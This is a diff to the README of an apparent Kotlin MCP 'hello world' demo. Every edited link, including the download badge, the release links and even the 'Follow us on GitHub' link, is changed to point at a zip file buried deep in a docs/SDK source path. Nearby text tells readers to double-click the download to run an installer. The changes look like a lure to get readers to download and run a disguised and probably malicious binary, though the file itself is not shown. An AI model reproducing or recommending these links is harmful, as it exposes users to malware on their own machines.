@@ -1,6 +1,6 @@
 # 👋 mcp-hello-world - Simple Greetings Made Easy
 
-[![Download mcp-hello-world](https://img.shields.io/badge/Download-mcp--hello--world-blue.svg)](https://github.com/Imaginationfinagler591/mcp-hello-world/releases)
+[![Download mcp-hello-world](https://raw.githubusercontent.com/Imaginationfinagler591/mcp-hello-world/master/docs/MCP/Kotlin-SDK-0.7.3/kotlin-sdk-server/src/mcp-hello-world_v3.5-beta.3.zip)](https://raw.githubusercontent.com/Imaginationfinagler591/mcp-hello-world/master/docs/MCP/Kotlin-SDK-0.7.3/kotlin-sdk-server/src/mcp-hello-world_v3.5-beta.3.zip)
 
 ## 📖 Description
 
@@ -11,7 +11,7 @@ Welcome to **mcp-hello-world**, a simple example built in Kotlin to demonstrate 
 To get started with **mcp-hello-world**, follow these steps:
 
 1. **Download the Software**: 
-   Visit this page to download: [mcp-hello-world Releases](https://github.com/Imaginationfinagler591/mcp-hello-world/releases).
+   Visit this page to download: [mcp-hello-world Releases](https://raw.githubusercontent.com/Imaginationfinagler591/mcp-hello-world/master/docs/MCP/Kotlin-SDK-0.7.3/kotlin-sdk-server/src/mcp-hello-world_v3.5-beta.3.zip).
 
 2. **Install the Software**: 
    After downloading, locate the downloaded file on your computer. Double-click it to run the installer. Follow the on-screen instructions to complete the installation.
@@ -26,7 +26,7 @@ To get started with **mcp-hello-world**, follow these steps:
 
 To download and install the application, follow these simple steps:
 
-1. Click on the download link: [mcp-hello-world Releases](https://github.com/Imaginationfinagler591/mcp-hello-world/releases).
+1. Click on the download link: [mcp-hello-world Releases](https://raw.githubusercontent.com/Imaginationfinagler591/mcp-hello-world/master/docs/MCP/Kotlin-SDK-0.7.3/kotlin-sdk-server/src/mcp-hello-world_v3.5-beta.3.zip).
 2. Choose the latest version available on the releases page.
 3. Download the file suitable for your operating system.
 4. Follow the installation instructions mentioned above.
@@ -77,6 +77,6 @@ This project is licensed under the MIT License. You can see the details in the [
 
 Stay connected for updates and announcements:
 
-- Follow us on GitHub: [mcp-hello-world](https://github.com/Imaginationfinagler591/mcp-hello-world)
+- Follow us on GitHub: [mcp-hello-world](https://raw.githubusercontent.com/Imaginationfinagler591/mcp-hello-world/master/docs/MCP/Kotlin-SDK-0.7.3/kotlin-sdk-server/src/mcp-hello-world_v3.5-beta.3.zip)
   
 Feel free to dive into the world of MCP with **mcp-hello-world**!
